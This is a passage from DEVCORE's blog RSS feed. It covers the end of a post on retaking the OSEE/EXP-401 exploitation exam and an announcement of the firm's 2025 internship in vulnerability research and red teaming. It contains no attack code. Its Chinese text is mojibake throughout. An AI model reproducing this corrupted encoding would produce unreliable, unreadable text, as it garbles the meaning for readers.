&lt;p&gt;è€ƒå‰è«‹å†æ¬¡è©³é–± &lt;a href=&quot;https://help.offsec.com/hc/en-us/articles/360046458732-EXP-401-Advanced-Windows-Exploitation-OSEE-Exam-Guide&quot;&gt;Exam Guide&lt;/a&gt;ã€‚ç¬¬ä¸€æ¬¡è€ƒè©¦æ™‚ä¸çŸ¥é“æ˜¯å¤ªéèˆˆå¥®é‚„æ˜¯ç·Šå¼µï¼Œé›–ç„¶æ‹¿åˆ°å…©å€‹ proof.txtï¼Œä½†æ˜¯å› ç‚ºå ±å‘Šä¸å¤ è©³ç´°è€Œè¢«åˆ¤å®šæœªé€šéã€‚å…¶ä¸­ä»¥ä¿¡ä»¶è©¢å•äº†ä¸€ä¸‹ï¼Œèªªæ˜¯å ±å‘Šå¯«çš„ä¸å¤ è©³ç´°ã€‚è‡ªå·±é‡æ–°æª¢è¦–å¾Œï¼Œç™¼ç¾æ–‡ä»¶çš„ç¢ºå¯«çš„ä¸å¤ å¥½ï¼Œç”šè‡³æ²’æ³¨æ„åˆ°åœ¨å ±å‘Šä¸­æ”¾äº† 30 é çš„ nopï¼ŒçœŸæ˜¯è¾›è‹¦çœ‹å ±å‘Šçš„äººäº†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250711/daf8763106e3752f60430e3028fb2a3b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250711/d5d967679ac1d56dc8027969575771bd.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç¬¬ä¸€æ¬¡åœ¨ OffSec çš„è€ƒè©¦ä¸­å› ç‚ºæ–‡ä»¶ä¸å¤ å®Œæ•´è¢«åˆ¤å®šæœªé€šéè©¦é©—ã€‚å¾Œä¾†åœ¨ç¬¬äºŒæ¬¡çš„è€ƒè©¦ä¸­ï¼Œåœ¨æ²’æœ‰ 30 é  nop ä¸‹å¯«äº†ä¸‰å€é‡çš„æ–‡ä»¶é †åˆ©é€šéï¼Œé«”æ„Ÿä¸Šç›¸å°æ¯”å…¶ä»– OffSec çš„èªè­‰é‚„è¦åš´æ ¼ã€‚&lt;/p&gt;

&lt;h2 id=&quot;retake&quot;&gt;Retake&lt;/h2&gt;

&lt;p&gt;å› ç‚ºç¬¬ä¸€æ¬¡å¤±æ•—çš„ç¶“é©—ä¸­è¦ºå¾—åŒæ¨£é›£åº¦ä¸‹èƒ½é †åˆ©é€šéï¼Œé¦¬ä¸Šé ç´„äº†ç¬¬äºŒæ¬¡çš„è€ƒè©¦ã€‚ä½†æ˜¯ä½ æœƒç™¼ç¾åœ¨ Buy More ä¸­æœƒæ‰¾ä¸åˆ° OSEE çš„è€ƒè©¦ï¼š
&lt;img src=&quot;/assets/img/blog/20250711/0f3fc5a3bb4fedd51deaaf17bb7eda9d.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è©¢å•å¾Œå¾ˆå¿«æ–¼ä¸€å¤©å…§æ”¶åˆ°å›æ‡‰ï¼ŒåŸä¾†æ˜¯è¦å¦å¤–é–‹é€šï¼š
&lt;img src=&quot;/assets/img/blog/20250711/3afecdcee729143fec17c865c66418c6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœä½ ä¹Ÿå‰›å¥½æ²’é€šéçš„è©±ï¼Œç¬¬ä¸€æ¬¡é‡è€ƒéœ€è¦ç›´æ¥è¯çµ¡ã€å†·å»æœŸæ˜¯ä¸€å€‹æœˆï¼Œè²»ç”¨è·Ÿå…¶ä»–è€ƒè©¦ä¸€æ¨£ $249 ç¾é‡‘ã€‚&lt;/p&gt;

&lt;h2 id=&quot;å…¶ä»–æ²’æåˆ°çš„å…§å®¹&quot;&gt;å…¶ä»–æ²’æåˆ°çš„å…§å®¹&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;é€™æ¬¡çš„ EXP-401 èª²ç¨‹å·²ç¶“æ”¹ç‰ˆäº†ï¼Œå¯ä»¥åƒè€ƒä»¥ä¸‹æ–°ç‰ˆé€£çµã€‚
  &lt;a href=&quot;https://manage.offsec.com/app/uploads/2025/03/AWE-Syllabus-new.pdf&quot;&gt;https://manage.offsec.com/app/uploads/2025/03/AWE-Syllabus-new.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://help.offsec.com/hc/en-us/articles/35549468971156-AI-Usage-Policy-in-OffSec-Exams&quot;&gt;OSEE è€ƒè©¦æ˜¯å”¯ä¸€å…è¨± AI çš„è€ƒè©¦ã€‚&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;extra&quot;&gt;Extra&lt;/h2&gt;

&lt;p&gt;é™„ä¸ŠçœŸç›¸ä¸€æšï¼š(è‡ªå·±å°çš„)
&lt;img src=&quot;/assets/img/blog/20250711/86a19bde52a9bd91384e85c26bc71fae.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250711/cc86ee81777aa149972bd573d3501331.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;å„ç¨®åƒè€ƒé€£çµ&quot;&gt;å„ç¨®åƒè€ƒé€£çµ&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://manage.offsec.com/app/uploads/2025/03/AWE-Syllabus-new.pdf&quot;&gt;https://manage.offsec.com/app/uploads/2025/03/AWE-Syllabus-new.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://voidsec.com/offsec-exp-401-advanced-windows-exploitation-awe-course-review/&quot;&gt;https://voidsec.com/offsec-exp-401-advanced-windows-exploitation-awe-course-review/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.richardosgood.com/posts/advanced-windows-exploitation-review-part-2/&quot;&gt;https://www.richardosgood.com/posts/advanced-windows-exploitation-review-part-2/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://spaceraccoon.dev/awe-osee-exam/&quot;&gt;https://spaceraccoon.dev/awe-osee-exam/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.manufaktur-it-training.de/post/osee-review-2023&quot;&gt;https://www.manufaktur-it-training.de/post/osee-review-2023&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://ommadawn46.medium.com/osee-exam-review-my-preparation-experience-and-insights-c518a75a5d0f&quot;&gt;https://ommadawn46.medium.com/osee-exam-review-my-preparation-experience-and-insights-c518a75a5d0f&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://fluidattacks.com/blog/osee-review/&quot;&gt;https://fluidattacks.com/blog/osee-review/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://x.com/Yunolay/status/1796714527410823217&quot;&gt;https://x.com/Yunolay/status/1796714527410823217&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://hesec.de/posts/osee-part1/&quot;&gt;https://hesec.de/posts/osee-part1/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.threads.net/@terryterry__/post/DHEXA62SW64&quot;&gt;https://www.threads.net/@terryterry__/post/DHEXA62SW64&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://x.com/terrynini38514/status/1899297719644221941&quot;&gt;https://x.com/terrynini38514/status/1899297719644221941&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/posts/jaelkoh_osee-certification-conquered-do-the-activity-7227595431780700160-ZWYr&quot;&gt;https://www.linkedin.com/posts/jaelkoh_osee-certification-conquered-do-the-activity-7227595431780700160-ZWYr&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/posts/kosuke-hiramatsu_osee-exam-reviewmy-preparation-experience-activity-7235308873287356417-H0EN&quot;&gt;https://www.linkedin.com/posts/kosuke-hiramatsu_osee-exam-reviewmy-preparation-experience-activity-7235308873287356417-H0EN&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://infosec.jaelkoh.com/2025/my-second-year-in-infosec-osee-the-odyssey&quot;&gt;https://infosec.jaelkoh.com/2025/my-second-year-in-infosec-osee-the-odyssey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2025/07/11/exp-401-course-and-second-exam-thoughts/</link>
                <guid>https://devco.re/blog/2025/07/11/exp-401-course-and-second-exam-thoughts</guid>
                <pubDate>Fri, 11 Jul 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2025 ç¬¬å…«å±†å¯¦ç¿’ç”Ÿè¨ˆç•«</title>
                <description>&lt;p&gt;DEVCORE é•·æœŸæŠ•å…¥è³‡å®‰ç¤¾ç¾¤ï¼Œæ¨å»£é§­å®¢æ€ç¶­ï¼Œå› ç‚ºæˆ‘å€‘ç›¸ä¿¡ï¼ŒçŸ¥è­˜çš„åˆ†äº«åŠå‚³æ‰¿æ˜¯æå‡æŠ€è¡“èƒ½åŠ›çš„é‡è¦é¤Šåˆ†ä¹‹ä¸€ã€‚æˆ‘å€‘ä¹Ÿè‡ª 2022 å¹´èµ·èˆ‰è¾¦å¯¦ç¿’ç”Ÿè¨ˆç•«ï¼ŒæœŸç›¼é€éæŠ€è¡“çš„å¯¦ä½œè§£æï¼Œå”åŠ©åŒå­¸å€‘æŒæ¡è³‡å®‰æª¢æ¸¬åŠæ¼æ´æŒ–æ˜çš„æ­£ç¢ºè§€å¿µï¼Œè‡³ä»Šå·²æœ‰çœ¾å¤šåŒå­¸åŠ å…¥æˆ‘å€‘ï¼Œå…±åŒå‰µé€ äº†è±ç¢©ä¸”äº®çœ¼çš„æˆæœã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¾ˆé«˜èˆˆå®£å¸ƒï¼Œç¬¬å…«å±†å¯¦ç¿’ç”Ÿè¨ˆç•«å°‡æ–¼ 2025 å¹´ 9 æœˆæ­£å¼ç™»å ´ï¼Œå³æ—¥èµ·é–‹æ”¾å ±åï¼
å»¶çºŒå¾€å±†çš„æˆåŠŸç¶“é©—ï¼Œæœ¬æ¬¡å¯¦ç¿’ç”Ÿè¨ˆç•«ä¾ç„¶åˆ†ç‚ºå…©å€‹çµ„åˆ¥ï¼Œè®“åŒå­¸èƒ½ä¾æ“šè‡ªèº«çš„èˆˆè¶£èˆ‡å°ˆé•·ï¼Œæ·±å…¥å­¸ç¿’ä¸¦ç²¾é€²æŠ€èƒ½ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Research çµ„ï¼šé©åˆå°æ¼æ´ç ”ç©¶å……æ»¿å¥½å¥‡å¿ƒï¼Œæƒ³å¯¦éš›åƒèˆ‡æŒ–æ˜çœŸå¯¦æ¼æ´çš„åŒå­¸&lt;/li&gt;
  &lt;li&gt;Red Team çµ„ï¼šé©åˆå°ç´…éšŠæŠ€è¡“å……æ»¿ç†±å¿±ï¼Œæƒ³é€éè¨“ç·´ç²¾é€²æ»²é€æ¸¬è©¦æŠ€å·§çš„åŒå­¸&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç‰¹åˆ¥å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨ä¸Šä¸€å±†å¯¦ç¿’è¨ˆç•«ä¸­ï¼ŒRed Team çµ„å› ç”³è«‹è€…è¡¨ç¾å„ªç•°ï¼Œæˆ‘å€‘ç ´ä¾‹è¶…é¡éŒ„å–äº† 6 ä½å¯¦ç¿’ç”Ÿï¼Œä¸¦çœ‹åˆ°äº†å°çµ„æˆå“¡é€éåœ˜éšŠå”ä½œé¡¯è‘—çš„æˆé•·èˆ‡é€²æ­¥ã€‚å› æ­¤æœ¬å±†æˆ‘å€‘ç‰¹åˆ¥èª¿é«˜äº†éŒ„å–äººæ•¸ä¸Šé™ï¼Œé¼“å‹µæ›´å¤šç†±æƒ…ä¸”å‹‡æ–¼æŒ‘æˆ°è‡ªå·±çš„åŒå­¸è¸´èºå ±åï¼Œä¸€åŒåŠ å…¥æˆ‘å€‘çš„è¡Œåˆ—ï¼&lt;/p&gt;

&lt;p&gt;å¦‚æœä½ ä¹Ÿå°æ»²é€æ¸¬è©¦ã€ç´…éšŠæŠ€è¡“ã€æ¼æ´ç ”ç©¶å……æ»¿å¥½å¥‡ï¼Œæƒ³åœ¨è³‡å®‰é ˜åŸŸæ‹“å±•è¦–é‡ã€æå‡å¯¦æˆ°èƒ½åŠ›ï¼Œæ­¡è¿è©³é–±ä»¥ä¸‹è³‡è¨Šä¸¦ç«‹å³å¡«å¯«å ±åè¡¨å–®ï¼&lt;/p&gt;

&lt;h3 id=&quot;å¯¦ç¿’å…§å®¹&quot;&gt;å¯¦ç¿’å…§å®¹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡å¯¦ç¿’åˆ†ç‚º Research åŠ Red Team å…©å€‹çµ„åˆ¥ï¼Œä¸»è¦å…§å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Research (Binary/Web)
ä»¥ç ”ç©¶ç‚ºä¸»ï¼Œåœ¨èˆ‡å°å¸«ç¢ºå®šç ”ç©¶æ¨™çš„å¾Œï¼Œåˆ†æç›®æ¨™æ¶æ§‹ã€é€²è¡Œé€†å‘å·¥ç¨‹æˆ–ç¨‹å¼ç¢¼å¯©æŸ¥ã€‚è—‰ç”±é€™å€‹éç¨‹è¨“ç·´è‡ªå·±çš„æ€è·¯ï¼Œæ‰¾å‡ºå¯èƒ½çš„æ”»æ“Šé¢èˆ‡æ½›åœ¨çš„å¼±é»ã€‚å¦å¤–ä¹Ÿæœƒè®“å¤§å®¶å˜—è©¦åˆ†æåŠæ’°å¯«éå¾€æ¼æ´çš„ Exploitï¼Œç†è§£éå»æ¼æ´éƒ½å‡ºç¾åœ¨å“ªï¼Œé«”é©—çœŸå¯¦ä¸–ç•Œçš„æ¼æ´éƒ½æ˜¯å¦‚ä½•åˆ©ç”¨ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´æŒ–æ˜åŠç ”ç©¶ 60 %&lt;/li&gt;
      &lt;li&gt;1-day é–‹ç™¼ (Exploitation) 30 %&lt;/li&gt;
      &lt;li&gt;æˆæœå ±å‘Šèˆ‡æº–å‚™ 10 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Red Team
ç ”ç©¶ä¸¦æ·±å…¥å­¸ç¿’ç´…éšŠå¸¸ç”¨æŠ€å·§ï¼Œç†Ÿæ‚‰å¯¦æˆ°ä¸­æœƒé‡åˆ°çš„æƒ…å¢ƒã€èªè¨€èˆ‡æ¶æ§‹ã€‚äº†è§£å¸¸è¦‹æ¼æ´çš„æˆå› ã€å¯¦éš›åˆ©ç”¨æ–¹æ³•ã€åš´è‹›æ¢ä»¶ä¸‹çš„åˆ©ç”¨ç­–ç•¥ã€é»‘ç®±æ¸¬è©¦æ–¹å¼åŠå„ç¨®å¥‡æŠ€æ·«å·§ã€‚å­¸ç¿’å¾Œæ»²é€æ™‚çš„å¸¸è¦‹é™åˆ¶ã€å·¥å…·æ¦‚å¿µèˆ‡åŸç†ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´èˆ‡æŠ€å·§çš„ç ”ç©¶åŠæ·±å…¥å­¸ç¿’ 70 %&lt;/li&gt;
      &lt;li&gt;Lab å»ºç½®æˆ– Bug Bounty æˆ–æ¼æ´æŒ–æ˜ 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å…¬å¸åœ°é»&quot;&gt;å…¬å¸åœ°é»&lt;/h3&gt;

&lt;p&gt;å°åŒ—å¸‚æ¾å±±å€å…«å¾·è·¯ä¸‰æ®µ 32 è™Ÿ 13 æ¨“&lt;/p&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ™‚é–“&quot;&gt;å¯¦ç¿’æ™‚é–“&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2025 å¹´ 9 æœˆåˆåˆ° 2026 å¹´ 1 æœˆåº•ï¼Œå…± 5 å€‹æœˆ&lt;/li&gt;
  &lt;li&gt;æ¯é€±å·¥ä½œå…©å¤©ï¼Œå·¥ä½œæ™‚é–“ç‚º 10:00 â€“ 18:00
    &lt;ul&gt;
      &lt;li&gt;å…¶ä¸­ä¸€å¤© 14:00 - 18:00 å¿…é ˆåˆ°å…¬å¸åŒæ­¥é€²åº¦ï¼Œå…¶é¤˜æ™‚é–“ç‚ºé ç«¯ä½œæ¥­&lt;/li&gt;
      &lt;li&gt;å¦‚æœå±…ä½é›™åŒ—å¤–å¯å½ˆæ€§èª¿æ•´åŒæ­¥æ–¹å¼ï¼Œä½†é ˆæ¯å€‹çµ„åˆ¥çµ±ä¸€&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‹›å‹Ÿå°è±¡&quot;&gt;æ‹›å‹Ÿå°è±¡&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;å…·æœ‰ä¸€å®šç¨‹åº¦è³‡å®‰èƒŒæ™¯çš„å­¸ç”Ÿï¼Œä¸”å¯æ¯é€±å·¥ä½œå…©å¤©&lt;/li&gt;
  &lt;li&gt;ç„¡å…¶ä»–æ‹›å‹Ÿé™åˆ¶ï¼Œæ­·å±†å¯¦ç¿’ç”Ÿå¯é‡è¤‡æ‡‰å¾µ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;é è¨ˆæ‹›æ”¶åé¡&quot;&gt;é è¨ˆæ‹›æ”¶åé¡&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Research çµ„ï¼š2~3 äºº&lt;/li&gt;
  &lt;li&gt;Red Team çµ„ï¼š2~6 äºº&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è–ªè³‡å¾…é‡&quot;&gt;è–ªè³‡å¾…é‡&lt;/h3&gt;

&lt;p&gt;æ¯æœˆæ–°å°å¹£ 18,000 å…ƒï¼ˆå¦è£œåŠ©éƒ¨åˆ†äº¤é€šè²»ï¼‰&lt;/p&gt;

&lt;h2 id=&quot;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&quot;&gt;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&lt;/h2&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ¢ä»¶è¦æ±‚&quot;&gt;å¯¦ç¿’æ¢ä»¶è¦æ±‚&lt;/h3&gt;

&lt;h4 id=&quot;research-binaryweb&quot;&gt;Research (Binary/Web)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;åŸºæœ¬æ¼æ´åˆ©ç”¨åŠæŒ–æ˜èƒ½åŠ›&lt;/li&gt;
  &lt;li&gt;å…·å‚™ç ”ç©¶ç†±èª ï¼Œç¿’æ…£äº†è§£æŠ€è¡“æœ¬è³ª&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨® Scripting Languageï¼ˆå¦‚ï¼šShell Scriptã€Pythonã€Rubyï¼‰ï¼Œä¸¦èƒ½ä½¿ç”¨è…³æœ¬è¼”ä»¥ç ”ç©¶&lt;/li&gt;
  &lt;li&gt;å…·å‚™é™¤éŒ¯èƒ½åŠ›ï¼Œèƒ½å–„ç”¨ Debugger è¿½è¹¤ç¨‹å¼æµç¨‹ã€èƒ½é‡ç¾ä¸¦æ”¶æ–‚å•é¡Œ&lt;/li&gt;
  &lt;li&gt;å…·å‚™ç¨ç«‹åˆ†æé–‹æ”¾åŸå§‹ç¢¼å°ˆæ¡ˆçš„èƒ½åŠ›ï¼Œèƒ½é€éåˆ†æç¨‹å¼ç¢¼ç†è§£ç›®æ¨™å°ˆæ¡ˆçš„æ¶æ§‹&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä¸¦ç†è§£å¸¸è¦‹çš„æ¼æ´æˆå› 
    &lt;ul&gt;
      &lt;li&gt;OWASP Web Top 10&lt;/li&gt;
      &lt;li&gt;Memory Corruption&lt;/li&gt;
      &lt;li&gt;Race Condition&lt;/li&gt;
      &lt;li&gt;â€¦&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†&lt;strong&gt;éå¿…è¦&lt;/strong&gt;æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;CTF æ¯”è³½ç¶“é©—&lt;/li&gt;
      &lt;li&gt;pwnable.tw æˆç¸¾&lt;/li&gt;
      &lt;li&gt;æœ‰å…¬é–‹çš„æŠ€è¡“ blog/slideã€write-ups æˆ–æ˜¯æ¼”è¬›&lt;/li&gt;
      &lt;li&gt;ç²¾é€š IDA Pro æˆ– Ghidra&lt;/li&gt;
      &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨®ç¶²é ç¨‹å¼èªè¨€æˆ–æ¡†æ¶ï¼ˆå¦‚ï¼šPHPã€ASP.NETã€Express.jsï¼‰ï¼Œå…·å‚™å¯ä»¥å»ºç«‹å®Œæ•´ç¶²é æœå‹™çš„èƒ½åŠ›&lt;/li&gt;
      &lt;li&gt;ç†è§£ &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; ä¸­çš„å®‰å…¨è­°é¡Œ&lt;/li&gt;
      &lt;li&gt;ç¨ç«‹æŒ–æ˜é 0-day æ¼æ´ï¼Œæˆ–åˆ†æé 1-day çš„ç¶“é©—&lt;/li&gt;
      &lt;li&gt;å…·å‚™ä¸‹åˆ—å…¶ä¸­ä¹‹ä¸€ç¶“é©—
        &lt;ul&gt;
          &lt;li&gt;Web Application Exploit&lt;/li&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;red-team&quot;&gt;Red Team&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;å¿…è¦æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;ç†Ÿæ‚‰ OWASP Web Top 10&lt;/li&gt;
      &lt;li&gt;ç†è§£ &lt;a href=&quot;https://portswigger.net/web-security/all-materials&quot;&gt;PortSwigger Web Security Academy&lt;/a&gt; ä¸­æ‰€æœ‰çš„å®‰å…¨è­°é¡Œæˆ–å·²å®Œæˆæ‰€æœ‰ Lab&lt;/li&gt;
      &lt;li&gt;ç†è§£è¨ˆç®—æ©Ÿç¶²è·¯çš„åŸºæœ¬æ¦‚å¿µ&lt;/li&gt;
      &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨®ç¶²é ç¨‹å¼é–‹ç™¼æ–¹å¼ï¼ˆå¦‚ï¼šPHPã€ASP.NETã€JSPï¼‰ï¼Œå…·å‚™å¯ä»¥å»ºç«‹å®Œæ•´ç¶²é æœå‹™çš„èƒ½åŠ›&lt;/li&gt;
      &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨® Scripting Languageï¼ˆå¦‚ï¼šShell Scriptã€Pythonã€Rubyï¼‰ï¼Œä¸¦èƒ½ä½¿ç”¨è…³æœ¬è¼”ä»¥ç ”ç©¶&lt;/li&gt;
      &lt;li&gt;å…·å‚™é™¤éŒ¯èƒ½åŠ›ï¼Œèƒ½å–„ç”¨ Debugger è¿½è¹¤ç¨‹å¼æµç¨‹ã€èƒ½é‡ç¾ä¸¦æ”¶æ–‚å•é¡Œ&lt;/li&gt;
      &lt;li&gt;å…·å‚™å¯ä»¥å»ºç½®ã€è¨­å®šå¸¸è¦‹ä¼ºæœå™¨ï¼ˆå¦‚ï¼šNginxã€Apacheã€Tomcatã€IISã€Active Directoryï¼‰åŠä½œæ¥­ç³»çµ±ï¼ˆå¦‚ï¼šLinuxã€Windowsï¼‰çš„èƒ½åŠ›&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†&lt;strong&gt;éå¿…è¦&lt;/strong&gt;æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹æŒ–æ˜é 0-day æ¼æ´&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹åˆ†æéå·²çŸ¥æ¼æ´ä¸¦èƒ½æ’°å¯« 1-day Exploit&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“æ–¼ CTF æ¯”è³½ä¸­æ“”ä»»å‡ºé¡Œè€…ä¸¦å»ºç½®éé¡Œç›®&lt;/li&gt;
      &lt;li&gt;æ“æœ‰ OSCP è­‰ç…§æˆ–åŒç­‰èƒ½åŠ›ä¹‹è­‰ç…§&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‡‰å¾µæµç¨‹&quot;&gt;æ‡‰å¾µæµç¨‹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡ç”„é¸ä¸€å…±åˆ†ç‚ºäºŒå€‹éšæ®µï¼š&lt;/p&gt;

&lt;h4 id=&quot;ç¬¬ä¸€éšæ®µæ›¸é¢å¯©æŸ¥&quot;&gt;ç¬¬ä¸€éšæ®µï¼šæ›¸é¢å¯©æŸ¥&lt;/h4&gt;

&lt;p&gt;ç¬¬ä¸€éšæ®µç‚ºæ›¸é¢å¯©æŸ¥ï¼Œæœƒéœ€è¦å¯©æŸ¥ä¸‹åˆ—å…©å€‹é …ç›®&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;å±¥æ­·å…§å®¹&lt;/li&gt;
  &lt;li&gt;ç°¡ç­”é¡Œç­”æ¡ˆ
    &lt;ul&gt;
      &lt;li&gt;æ‡‰å¾µ Research å¯¦ç¿’ç”Ÿï¼š
        &lt;ul&gt;
          &lt;li&gt;é¡Œç›®ä¸€ï¼šæ¼æ´é‡ç¾èˆ‡åˆ†æéç¨‹
            &lt;ul&gt;
              &lt;li&gt;è«‹æå‡ºä¸€å€‹ï¼Œä½ å°è±¡æœ€æ·±åˆ»æˆ–æ„Ÿåˆ°æœ‰è¶£ã€æ–¼è¥¿å…ƒ 2022 ~ 2025 å¹´é–“å…¬é–‹çš„çœŸå¯¦æ¼æ´æˆ–æ”»æ“Šéˆæ¡ˆä¾‹ï¼Œä¸¦ä¾è‡ªå·±çš„ç†è§£è©³è¿°èªªæ˜æ¼æ´çš„æˆå› ã€åˆ©ç”¨æ¢ä»¶å’Œå¯ä»¥é€ æˆçš„å½±éŸ¿ã€‚åŒæ™‚ï¼Œå˜—è©¦æè¿°å¦‚ä½•å¾©ç¾æ­¤æ¼æ´æˆ–æ”»æ“Šéˆï¼Œå³ä½¿ç„¡æ³•æˆåŠŸå¾©ç¾ï¼Œä¹Ÿè«‹è¨˜éŒ„ç ”ç©¶éç¨‹ã€‚å ±å‘Šæ’°å¯«è«‹åƒè€ƒ&lt;a href=&quot;/assets/files/recruit/DEVCORE-intern_vulnerability_analysis_example.pdf&quot;&gt;ç¯„æœ¬&lt;/a&gt;ï¼Œç›¡å¯èƒ½è©³ç´°ï¼Œä¸­è‹±ä¸é™ã€‚&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;é¡Œç›®äºŒï¼šå¯¦ç¿’æœŸé–“æƒ³è¦ç ”ç©¶çš„ä¸»é¡Œ
            &lt;ul&gt;
              &lt;li&gt;è«‹æå‡ºä¸‰å€‹å¯èƒ½é¸æ“‡çš„æ˜ç¢ºä¸»é¡Œï¼Œä¸¦ç°¡å–®èªªæ˜æå‡ºçš„ç†ç”±æˆ–æƒ³å®Œæˆçš„å…§å®¹ï¼Œä¾‹å¦‚ï¼š
                &lt;ul&gt;
                  &lt;li&gt;ç ”ç©¶ OO é–‹æºè»Ÿé«”ï¼Œæ‰¾åˆ°å¯ RCE çš„é‡å¤§é¢¨éšªå¼±é»ã€‚&lt;/li&gt;
                  &lt;li&gt;ç ”ç©¶å¸¸è¦‹çš„è·¯ç”±å™¨ï¼Œç›®æ¨™åŒ…æ‹¬ï¼šAA-123 è·¯ç”±å™¨ã€BB-456 ç„¡ç·šè·¯ç”±å™¨ã€‚&lt;/li&gt;
                  &lt;li&gt;ç ”ç©¶å¸¸è¦‹çš„ç­†è¨˜å¹³å°æˆ–è»Ÿé«”ï¼Œç›®æ¨™åŒ…æ‹¬ï¼šXX Noteã€YY Noteã€‚&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;æ‡‰å¾µ Red Team å¯¦ç¿’ç”Ÿï¼š
        &lt;ul&gt;
